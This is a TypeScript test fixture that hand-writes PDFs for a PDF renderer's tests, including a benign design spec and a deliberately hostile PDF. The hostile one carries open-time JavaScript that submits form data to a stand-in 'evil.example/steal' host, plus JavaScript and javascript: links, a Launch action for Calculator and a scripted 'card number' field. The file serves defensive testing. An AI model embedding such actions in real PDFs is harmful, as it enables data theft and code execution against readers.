/**
 * PDFs for the dev fake (`?fake-binary`) and the PDF renderer's tests (#2260),
 * here rather than under the dev harness so tests import them statically. Only
 * the dev fake imports it, so a release build carries none of it. Written out by
 * hand: a few lines of Helvetica per page, link annotations, and, for the
 * hostile one, every way a PDF asks to run something. ASCII only, so a
 * string's length is its byte length and the cross-reference offsets hold.
 */

/** Where a link goes: a web page, a page of this document (1-based), or a PDF action that must do nothing. */
export type FakeTarget = { uri: string } | { page: number } | { js: string } | { launch: string };

export interface FakeLink {
  /** The link's box in PDF points, `[x1, y1, x2, y2]` from the bottom left of a 612×792 page. */
  rect: [number, number, number, number];
  to: FakeTarget;
}

export interface FakePage {
  lines: string[];
  links?: FakeLink[];
  /** A text field on the page whose keystroke action is JavaScript (a form the viewer must not draw as one). */
  field?: string;
  /** A one-colour image on the page (`rrggbb`, 2×2 pixels drawn 120 pt wide), so a page can change by its image alone. */
  image?: string;
  /** A square annotation that draws itself (its own appearance stream), as a reviewer's mark does. */
  box?: true;
  /** A gradient from this colour (`rrggbb`) to white, a shading pdf.js names per page (`pattern_p0_1`). */
  gradient?: string;
}

export interface FakePdfSpec {
  pages: FakePage[];
  /** JavaScript the document asks to run when it opens (`/OpenAction` and the `/JavaScript` name tree). */
  openJs?: string;
}

const escape = (text: string) => text.replace(/[\\()]/g, (c) => `\\${c}`);

function action(to: FakeTarget, pageRef: (n: number) => string): string {
  if ("uri" in to) return `/A << /S /URI /URI (${escape(to.uri)}) >>`;
  if ("page" in to) return `/Dest [${pageRef(to.page)} /XYZ 0 792 0]`;
  if ("js" in to) return `/A << /S /JavaScript /JS (${escape(to.js)}) >>`;
  return `/A << /S /Launch /F (${escape(to.launch)}) >>`;
}

/** A PDF of `spec`'s pages, each 612×792 points (US Letter), its text at 72 pt from the left. */
export function fakePdf(spec: FakePdfSpec): Uint8Array {
  const n = spec.pages.length;
  // 1 catalog, 2 pages, 3 font, then a page and its content per page, then annotations.
  const pageId = (k: number) => 4 + 2 * k;
  const pageRef = (page: number) => `${pageId(page - 1)} 0 R`;
  const objects: string[] = [];
  const extra: string[] = [];
  const add = (body: string) => {
    extra.push(body);
    return 3 + 2 * n + extra.length;
  };
  const fields: number[] = [];
  spec.pages.forEach((page, k) => {
    const annots = (page.links ?? []).map((link) =>
      add(`<< /Type /Annot /Subtype /Link /Rect [${link.rect.join(" ")}] /Border [0 0 0] ${action(link.to, pageRef)} >>`),
    );
    if (page.box) {
      const look = "0 0 1 RG 2 w 1 1 98 48 re S";
      const ap = add(`<< /Type /XObject /Subtype /Form /BBox [0 0 100 50] /Length ${look.length} >>\nstream\n${look}\nendstream`);
      annots.push(add(`<< /Type /Annot /Subtype /Square /Rect [300 500 400 550] /AP << /N ${ap} 0 R >> >>`));
    }
    if (page.field !== undefined) {
      const field = add(
        `<< /Type /Annot /Subtype /Widget /FT /Tx /T (${escape(page.field)}) /V (${escape(page.field)}) /Rect [72 100 300 124] /P ${pageId(k)} 0 R /DA (/F1 12 Tf 0 g) /AA << /K << /S /JavaScript /JS (app.alert\\("field"\\)) >> >> >>`,
      );
      annots.push(field);
      fields.push(field);
    }
    const image =
      page.image === undefined
        ? null
        : add(`<< /Type /XObject /Subtype /Image /Width 2 /Height 2 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /ASCIIHexDecode /Length 25 >>\nstream\n${page.image.repeat(4)}>\nendstream`);
    const text =
      page.lines.map((line, i) => `BT /F1 ${i === 0 ? 20 : 12} Tf 72 ${720 - i * 28} Td (${escape(line)}) Tj ET`).join("\n") +
      (image === null ? "" : "\nq 120 0 0 120 72 300 cm /Im1 Do Q");
    const rgb = (hex: string) => [0, 2, 4].map((at) => (parseInt(hex.slice(at, at + 2), 16) / 255).toFixed(3)).join(" ");
    const shading =
      page.gradient === undefined
        ? null
        : add(`<< /ShadingType 2 /ColorSpace /DeviceRGB /Coords [0 0 1 0] /Function << /FunctionType 2 /Domain [0 1] /C0 [${rgb(page.gradient)}] /C1 [1 1 1] /N 1 >> >>`);
    const painted = text + (shading === null ? "" : "\nq 200 0 0 50 72 200 cm /Sh1 sh Q");
    const xobject = (image === null ? "" : ` /XObject << /Im1 ${image} 0 R >>`) + (shading === null ? "" : ` /Shading << /Sh1 ${shading} 0 R >>`);
    objects[pageId(k)] =
      `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >>${xobject} >> /Contents ${pageId(k) + 1} 0 R` +
      (annots.length > 0 ? ` /Annots [${annots.map((a) => `${a} 0 R`).join(" ")}]` : "") +
      " >>";
    objects[pageId(k) + 1] = `<< /Length ${painted.length} >>\nstream\n${painted}\nendstream`;
  });
  const js = spec.openJs === undefined ? "" : `<< /S /JavaScript /JS (${escape(spec.openJs)}) >>`;
  objects[1] =
    "<< /Type /Catalog /Pages 2 0 R" +
    (js === "" ? "" : ` /OpenAction ${js} /Names << /JavaScript << /Names [(open) ${js}] >> >>`) +
    (fields.length > 0 ? ` /AcroForm << /Fields [${fields.map((f) => `${f} 0 R`).join(" ")}] /DA (/F1 12 Tf 0 g) >>` : "") +
    " >>";
  objects[2] = `<< /Type /Pages /Kids [${spec.pages.map((_, k) => `${pageId(k)} 0 R`).join(" ")}] /Count ${n} >>`;
  objects[3] = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>";
  extra.forEach((body, i) => (objects[4 + 2 * n + i] = body));

  let out = "%PDF-1.7\n";
  const offsets: number[] = [];
  for (let id = 1; id < objects.length; id++) {
    offsets[id] = out.length;
    out += `${id} 0 obj\n${objects[id]}\nendobj\n`;
  }
  const xref = out.length;
  out += `xref\n0 ${objects.length}\n0000000000 65535 f \n`;
  for (let id = 1; id < objects.length; id++) out += `${String(offsets[id]).padStart(10, "0")} 00000 n \n`;
  out += `trailer\n<< /Size ${objects.length} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return new TextEncoder().encode(out);
}

/** `docs/spec.pdf`: three pages, an external link on the first, a link to page 3 on the second. */
export const SPEC_PDF = () =>
  fakePdf({
    pages: [
      {
        lines: ["Payout service: design", "Pays out SEPA batches once a day.", "The PSP's status page: psp.example.com/status"],
        links: [{ rect: [72, 656, 400, 676], to: { uri: "https://psp.example.com/status" } }],
      },
      { lines: ["Retries", "Transient PSP errors are retried five times.", "See page 3 for the backoff."], links: [{ rect: [72, 656, 300, 676], to: { page: 3 } }] },
      { lines: ["Backoff", "Exponential, with jitter, capped at ten minutes."] },
    ],
  });

/**
 * `docs/hostile.pdf`: JavaScript on open, a JavaScript link, a `javascript:` URI, a Launch action and a text field
 * with a keystroke script. Drawn, it is two pages of text and one link that goes to the PSP; nothing else does anything.
 */
export const HOSTILE_PDF = () =>
  fakePdf({
    openJs: 'app.alert("pdf-js-ran"); this.submitForm("https://evil.example/steal");',
    pages: [
      {
        lines: ["A hostile PDF", "It asks to run JavaScript when it opens.", "Run script", "javascript: link", "Launch calc", "The PSP"],
        links: [
          { rect: [72, 636, 300, 652], to: { js: 'app.alert("link-js-ran")' } },
          { rect: [72, 608, 300, 624], to: { uri: "javascript:alert('uri-js-ran')" } },
          { rect: [72, 580, 300, 596], to: { launch: "/System/Applications/Calculator.app" } },
          { rect: [72, 552, 300, 568], to: { uri: "https://psp.example.com/" } },
        ],
        field: "card number",
      },
      { lines: ["Page two", "Nothing here either."] },
    ],
  });
